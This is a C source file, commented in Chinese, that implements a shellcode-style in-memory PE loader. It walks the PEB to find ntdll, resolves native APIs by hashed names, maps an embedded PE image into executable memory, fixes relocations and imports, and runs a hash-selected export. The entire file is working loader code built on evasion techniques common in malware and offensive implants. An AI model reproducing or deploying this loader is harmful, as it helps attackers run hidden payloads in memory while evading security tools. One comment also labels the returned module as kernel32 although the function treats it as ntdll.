#include"load.h"

int start(ShellcodeStr* code)
{
	DWORD run = 0xe082c95;
	Run R = MemLoadLibrary(code,&run);
	if (R)
	{
		R(code);
	}
	return 0;
}

/// <summary>
/// 初始化函数
/// </summary>
/// <param name="func"></param>
/// <returns></returns>
BOOL initfunction(FUNCTION* func)
{
	BOOL r = TRUE;
	//获取ntdll
	HMODULE ntdll = GetNtdll();
	func->pLdrGetProcedureAddress = MyGetProcAddress(ntdll, 0xc1aa7aa3);
	func->pNtAllocateVirtualMemoryT = MyGetProcAddress(ntdll, 0xf0e90fb7);
	func->pLdrLoadDll = MyGetProcAddress(ntdll, 0x914c55bc);
	func->pRtlInitAnsiString = MyGetProcAddress(ntdll, 0xfb514bd2);
	func->pRtlAnsiStringToUnicodeString = MyGetProcAddress(ntdll, 0x9262bab);
	func->pRtlFreeUnicodeString = MyGetProcAddress(ntdll, 0x170a5788);
	for (size_t i = 0; i < 6; i++)
	{
		if (((PDWORD)func)[i] == 0)
		{
			r = FALSE;
		}
	}
	return r;
}

DWORD WINAPI MemLoadLibrary(ShellcodeStr* shellcoder,PDWORD run)
{
	FUNCTION func = { 0 };
	//函数初始化失败
	if (!initfunction(&func))
	{
		return 0;
	}
	
	LPCVOID lpFileData = &shellcoder->File;
	DWORD DataLength = shellcoder->dwFilelen;
	/****************初始化调用函数********************/
	ProcDllMain pDllMain = NULL;
	void* pMemoryAddress = NULL;

	ANSI_STRING ansiStr;
	UNICODE_STRING UnicodeString;

	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	int i = 0;
	pDosHeader = (PIMAGE_DOS_HEADER)lpFileData; // DOS头
	//检查dos头的标记
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) goto CODEEXIT; //0×5A4D : MZ
	//取得pe头
	pNTHeader = (PIMAGE_NT_HEADERS)((DWORDX)lpFileData + pDosHeader->e_lfanew); // PE头
	//检查pe头的合法性
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE) goto CODEEXIT; //0×00004550: PE00
	//取得节表（段表）
	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORDX)pNTHeader + sizeof(IMAGE_NT_HEADERS));
	//验证每个节表的空间
	for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++)
	{
		if ((pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData) > (DWORD)DataLength) goto CODEEXIT;
	}
	/**********************************************************************/
	
	// 分配虚拟内存
	SIZE_T uSize = pNTHeader->OptionalHeader.SizeOfImage;
	func.pNtAllocateVirtualMemoryT((HANDLE)-1, &pMemoryAddress, 0, &uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pMemoryAddress != NULL)
	{
		int MoveSize = pNTHeader->OptionalHeader.SizeOfHeaders + pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
		//复制头和段信息
		for (i = 0; i < MoveSize; i++)
		{
			*((PCHAR)pMemoryAddress + i) = *((PCHAR)lpFileData + i);
		}

		//复制每个节
		for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
		{
			if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)continue;
			// 定位该节在内存中的位置
			void* pSectionAddress = (void*)((DWORDX)pMemoryAddress + pSectionHeader[i].VirtualAddress);
			// 复制段数据到虚拟内存
			//为了少用一个API,直接用上面的单字节复制数据就行了
			for (size_t k = 0; k < pSectionHeader[i].SizeOfRawData; k++)
			{
				*((PCHAR)pSectionAddress + k) = *((PCHAR)lpFileData + pSectionHeader[i].PointerToRawData + k);
			}
		}

		/*******************重定位信息****************************************************/
		if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0
			&& pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
		{

			DWORDX Delta = (DWORDX)pMemoryAddress - pNTHeader->OptionalHeader.ImageBase;
			DWORDX* pAddress;
			//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址
			PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((DWORDX)pMemoryAddress
				+ pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
			{
				WORD* pLocData = (WORD*)((DWORDX)pLoc + sizeof(IMAGE_BASE_RELOCATION));
				//计算本节需要修正的重定位项（地址）的数目
				int NumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				for (i = 0; i < NumberOfReloc; i++)
				{
					if ((DWORDX)(pLocData[i] & 0xF000) == 0x00003000 || (DWORDX)(pLocData[i] & 0xF000) == 0x0000A000) //这是一个需要修正的地址
					{
						// 举例：
						// pLoc->VirtualAddress = 0×1000;
						// pLocData[i] = 0×313E; 表示本节偏移地址0×13E处需要修正
						// 因此 pAddress = 基地址 + 0×113E
						// 里面的内容是 A1 ( 0c d4 02 10) 汇编代码是： mov eax , [1002d40c]
						// 需要修正1002d40c这个地址
						pAddress = (DWORDX*)((DWORDX)pMemoryAddress + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						*pAddress += Delta;
					}
				}
				//转移到下一个节进行处理
				pLoc = (PIMAGE_BASE_RELOCATION)((DWORDX)pLoc + pLoc->SizeOfBlock);
			}
			/***********************************************************************/
		}

		/******************* 修正引入地址表**************/
		DWORDX Offset = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		if (Offset == 0)
			goto CODEEXIT; //No Import Table

		PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORDX)pMemoryAddress + Offset);

		PIMAGE_IMPORT_BY_NAME pByName = NULL;
		while (pID->Characteristics != 0)
		{
			PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->FirstThunk);
			PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((DWORDX)pMemoryAddress + pID->OriginalFirstThunk);
			//获取dll的名字
			char* pName = (char*)((DWORDX)pMemoryAddress + pID->Name);
			HANDLE hDll = 0;

			func.pRtlInitAnsiString(&ansiStr, pName);
			func.pRtlAnsiStringToUnicodeString(&UnicodeString, &ansiStr, 1);
			func.pLdrLoadDll(NULL, NULL, &UnicodeString, &hDll);
			func.pRtlFreeUnicodeString(&UnicodeString);
			if (hDll == NULL) {

				goto CODEEXIT; //NOT FOUND DLL
			}

			//获取DLL中每个导出函数的地址，填入IAT
			//每个IAT结构是 ：
			// union { PBYTE ForwarderString;
			// PDWORDX Function;
			// DWORDX Ordinal;
			// PIMAGE_IMPORT_BY_NAME AddressOfData;
			// } u1;
			// 长度是一个DWORDX ，正好容纳一个地址。
			for (i = 0; ; i++)
			{
				if (pOriginalIAT[i].u1.Function == 0)break;
				FARPROC lpFunction = NULL;
				if (IMAGE_SNAP_BY_ORDINAL(pOriginalIAT[i].u1.Ordinal)) //这里的值给出的是导出序号
				{
					if (IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal))
					{
						func.pLdrGetProcedureAddress(hDll, NULL, IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal), &lpFunction);
					}
				}
				else//按照名字导入
				{
					//获取此IAT项所描述的函数名称
					pByName = (PIMAGE_IMPORT_BY_NAME)((DWORDX)pMemoryAddress + (DWORDX)(pOriginalIAT[i].u1.AddressOfData));
					if ((char*)pByName->Name)
					{
						func.pRtlInitAnsiString(&ansiStr, (char*)pByName->Name);
						func.pLdrGetProcedureAddress(hDll, &ansiStr, 0, &lpFunction);
					}
				}
				//标记***********
				if (lpFunction != NULL) //找到了！
					pRealIAT[i].u1.Function = (DWORDX)lpFunction;
				else
					goto CODEEXIT;
			}
			//move to next
			pID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORDX)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
		}
		/***********************************************************/
		//修正基地址
		pNTHeader->OptionalHeader.ImageBase = (DWORDX)pMemoryAddress;
		pDllMain = (ProcDllMain)(pNTHeader->OptionalHeader.AddressOfEntryPoint + (DWORDX)pMemoryAddress);
		pDllMain(0, DLL_PROCESS_ATTACH, pMemoryAddress); 
	}

	pMemoryAddress = MyGetProcAddress(pMemoryAddress, *run);
CODEEXIT:
	return (DWORDX)pMemoryAddress;

}

//获得函数地址
DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName) {

	DWORD dwProcAddress = 0;
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((DWORD)pDosHdr + pDosHdr->e_lfanew);
	//获取导出表
	PIMAGE_EXPORT_DIRECTORY pExtTbl = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHdr + pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	//解析导出表
	//获取函数地址数组
	PDWORD pAddressOfFunc = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfFunctions);
	//获取名字数组
	PDWORD pAddressOfName = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfNames);
	//获取序号导出表
	PWORD pAddressOfNameOrdinal = (PWORD)((DWORD)hModule + pExtTbl->AddressOfNameOrdinals);
	//判断序号或字符串导出
	if ((DWORD)lpProcName & 0xffff0000)
	{
		//通过名称获取导出地址
		DWORD dwSize = pExtTbl->NumberOfNames;
		for (DWORD i = 0; i < dwSize; i++)
		{
			//获取名称字符串
			DWORD dwAddrssOfName = (DWORD)hModule + pAddressOfName[i];
			//判断名称
			int nRet = MyStrcmp(lpProcName, (char*)dwAddrssOfName);
			if (nRet == 0)
			{
				//名称一致则通过名称序号表获得序号
				WORD wHint = pAddressOfNameOrdinal[i];
				//根据序号获得函数地址
				dwProcAddress = (DWORD)hModule + pAddressOfFunc[wHint];
				return dwProcAddress;
			}
		}
		//找不到则地址为0
		dwProcAddress = 0;
	}
	else
	{
		//通过序号获取导出地址
		DWORD nId = (DWORD)lpProcName - pExtTbl->Base;
		dwProcAddress = (DWORD)hModule + pAddressOfFunc[nId];
	}
	return dwProcAddress;
}

/// <summary>
/// 获取ntdll地址
/// </summary>
/// <returns></returns>
HMODULE GetNtdll() {
	HMODULE NTDLL = NULL;
	_asm {
		mov eax, fs: [0x18] ;//找到teb
		mov eax, [eax + 0x30];//peb
		mov eax, [eax + 0x0c];//PEB_LDR_DATA
		mov eax, [eax + 0x0c];//LIST_ENTRY 主模块
		mov eax, [eax];//ntdll	
		mov eax, dword ptr[eax + 0x18];//kernel32基址
		mov NTDLL, eax
	}
	return NTDLL;
}

//获取函数名的hash
DWORD GetProcHash(char* lpProcName) {
	char* p = lpProcName;
	DWORD result = 0;
	do {
		result = (result << 7) - result;
		result += *p;
	} while (*p++);
	return result;
}
//比较字符串
BOOL MyStrcmp(DWORD str1, char* str2) {

	if (str1 == GetProcHash(str2)) {
		return 0;
	}
	return 1;
}


